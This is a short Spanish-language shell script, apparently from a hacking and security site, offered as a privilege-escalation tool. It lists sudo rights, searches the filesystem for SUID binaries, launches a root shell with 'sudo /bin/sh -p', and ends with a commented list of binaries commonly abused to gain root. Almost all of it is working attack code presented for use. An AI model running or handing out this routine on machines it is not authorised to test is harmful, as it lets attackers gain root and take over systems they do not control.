#!/bin/sh

# Busca archivos en el sistema con SUID activo, como Super User SUID (Set User ID):4000
# Vamos a usar esos ficheros para ejecutar una Shell como SuperUser y elevar a Root
# (r) hackingyseguridad.com 2026
# antonio_taboada
# Uso.: $sh root.sh 

echo " busca fichero que se ejecutan como root en el sistema:"
sudo -l
find / -perm -4000 2>/dev/null

# por ejemplo ejecutamos una shell con con sudo

/usr/bin/sudo /bin/sh -p

whoami

# Lista de ficheros habituales 
# /usr/bin/env 
# /usr/bin/sudo 
# /usr/bin/su 
# /usr/bin/pkexec
# /usr/bin/screen
# /usr/bin/passwd
# /usr/bin/chsh 
# /usr/bin/chfn
# /usr/bin/newgrp
# /usr/bin/gpasswd
# /usr/bin/mount
# /usr/bin/umount
# /apps/swbase/CA/AccessControl/bin/sesu 
# /apps/swbase/CA/AccessControl/bin/sesudo
# /usr/bin/lxc
# /usr/bin/at




